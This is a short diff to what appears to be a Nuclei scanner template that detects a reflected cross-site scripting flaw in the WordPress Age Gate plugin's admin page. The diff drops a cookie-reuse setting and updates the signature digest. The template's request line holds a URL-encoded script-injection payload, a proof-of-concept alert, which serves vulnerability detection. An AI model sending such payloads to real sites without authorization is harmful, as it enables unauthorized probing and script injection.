@@ -29,8 +29,6 @@ http:
         GET /wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
         Host: {{Hostname}}
 
-    cookie-reuse: true
-
     matchers-condition: and
     matchers:
       - type: word
@@ -48,5 +46,4 @@ http:
       - type: status
         status:
           - 200
-
-# digest: 4b0a00483046022100f0304dbf4fb8602458c1608bb0ba2abf334aec2938b6569d124ca24d670f19c2022100eb179fe18bbee5ce31c5d5556bda2b4bf2de27a3770537b518ec914d98f3ffd1:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022100ab7c1eb2efb3ce04e132836e2731af63c6ce48f5b4a82b8100cad15f436a1b82022076f942b4f716903aad3f72840933bae027fe28d21b2ad43553a965c9b378003c:922c64590222798bb761d5b6d8e72950
